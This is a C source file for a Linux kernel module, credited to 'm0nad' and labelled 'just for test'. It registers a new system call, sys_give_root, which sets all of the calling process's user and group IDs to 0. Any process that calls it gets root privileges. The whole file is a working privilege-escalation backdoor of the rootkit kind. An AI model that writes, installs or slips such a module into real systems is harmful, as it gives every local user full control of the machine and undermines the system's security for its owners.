/*
 * just for test :D
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/cred.h>
#include <linux/version.h>
#include "rsysadd.h"


// written by m0nad
asmlinkage long sys_give_root(void){

        struct cred *newcreds;

        kuid_t u ;

        kgid_t g ;

        u . val = 0 ;

        g . val = 0 ;

        newcreds = prepare_creds();

        if (newcreds == NULL)

                return -1;

        newcreds->uid = u ;

        newcreds->gid = g;

        newcreds->euid = u;

        newcreds->egid = g ;

        newcreds->suid = u ;

        newcreds->sgid = g;

        newcreds->fsuid = u ;

        newcreds->fsgid=g;

        commit_creds(newcreds);

        return 0;

}
static int __init sys_give_root_init(void){
	int sysnum;

	sysnum = register_syscall(sys_give_root);
	if(sysnum < 0){
		printk(KERN_INFO "[sys_give_root] was not registered\n");
		return -1;
	}

	printk(KERN_INFO "[sys_give_root] registered in [%d]\n", sysnum);
	return 0;
}

static void __exit sys_give_root_exit(void){
	unregister_syscall(sys_give_root);
}

module_init(sys_give_root_init);
module_exit(sys_give_root_exit);
MODULE_LICENSE("GPL");
